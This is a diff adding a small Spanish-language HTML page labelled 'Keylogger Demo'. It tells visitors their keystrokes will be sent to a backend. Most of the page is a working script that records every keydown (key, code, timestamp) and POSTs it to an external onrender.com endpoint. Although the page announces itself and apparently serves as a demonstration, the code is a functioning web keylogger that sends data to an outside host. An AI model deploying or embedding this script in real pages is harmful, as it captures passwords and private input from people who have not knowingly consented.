@@ -1,0 +1,27 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8">
+  <title>Keylogger Demo</title>
+</head>
+<body>
+  <h1>Demo: Keylogger Web</h1>
+  <p>Pulsa cualquier tecla y se enviará al backend.</p>
+
+  <button onclick="window.location.href='index.html'">Volver a Inicio</button>
+
+  <script>
+    document.addEventListener('keydown', function(e) {
+      fetch('https://backend-prueba-o523.onrender.com/captura', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          key: e.key,
+          code: e.code,
+          time: new Date().toISOString()
+        })
+      });
+    });
+  </script>
+</body>
+</html>
